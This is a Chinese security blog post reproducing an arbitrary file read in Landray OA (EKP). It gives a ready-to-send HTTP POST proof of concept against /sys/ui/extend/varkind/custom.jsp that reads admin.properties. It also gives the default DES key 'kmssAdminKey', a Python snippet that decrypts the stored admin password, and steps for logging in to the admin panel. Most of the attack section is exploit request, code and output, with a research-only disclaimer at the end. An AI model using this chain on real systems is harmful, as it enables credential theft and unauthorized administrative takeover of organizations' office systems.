> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4VTgnH3Hg15xE7W478fmUg)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyI8SNOVqpyMeg5k7mhuVZvdrXnHVmEweCKUtVnlibjSn6D7qMvELhYicw/640?wx_fmt=png)

X 凌 OA 系统任意文件读取 - DES 解密

一、漏洞描述  

深圳市蓝凌软件股份有限公司数字 OA(EKP) 存在任意文件读取漏洞。攻击者可利用漏洞获取敏感信息

二、漏洞影响

蓝凌 OA

三、

利用 蓝凌 OA custom.jsp 任意文件读取漏洞 读取配置文件

读取路径：

```
/WEB-INF/KmssConfig/admin.properties
```

读取文件：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyPPehvwoLicD4Ay350Kvr7tYouRNZR4BWVYeibBPYwiajoEcZ6DibOY2Lrw/640?wx_fmt=png)

POC：

```
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: 127.0.0.1
User-Agent: Go-http-client/1.1
Content-Length: 60
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```

获取密码 DES 解密登陆后台：默认密钥为 kmssAdminKey

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyy8unBaiaVhTeZFXjpZE9FdFQgp9kPW4wiaK8jqUstDhvCX8ovTo9wQTg/640?wx_fmt=png)

访问后台登台：

http://127.0.0.1/admin.do

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKytWxvSyuzicS2ibbOVsO3u1JN5wwlQiaQucr2iaHooQLQynQZ3eXX538IbA/640?wx_fmt=png)  

成功登陆后台：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyn66vIhhvIGia1KLAxZdROYdLibF5gRnKiaMXKiazsCxQmyYFNG7oU0GTPg/640?wx_fmt=png)

编写 POC 脚本验证：  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyv3vTmR0qvLicg7BzNMzWYiaXLPX9nJKWOI9AONBseZRJQNHPta3gKSOQ/640?wx_fmt=png)

还需要自己去验证解密：  

编写本地 DES 解密：  

```
def decrypt_str(s):
 k = des(Des_Key, ECB, Des_IV, pad=None, padmode=PAD_PKCS5)
 decrystr = k.decrypt(base64.b64decode(s))
 print(decrystr)
 return decrypt_str
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyT7U9ocreOIJfTqUOIZCyHxjpN3VRcc8KEOeAM18MIdl3UWqAgOKesA/640?wx_fmt=png)

发现 key 字符过长：  

ValueError: Invalid DES key size. Key must be exactly 8 bytes long.

密钥长了，查了一下下 需要前面 8 位就 OK 也能解开

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKylbfqggQicwI4RGbQic5qiaw6Mtwa9eFvlvW66NPWcN4pl7v00dpQ9UpTA/640?wx_fmt=png)

直接解密明文：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjdZYhoEcuXbEjgeibMl8RcKyyJUBC848tOXDm9wU5CIWdtyZ4w6RaX2ca1epaicVM3R9f6Yhy3ETOEA/640?wx_fmt=png)

参考：  

https://github.com/Cr4y0nXX/LandrayReadAnyFile

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)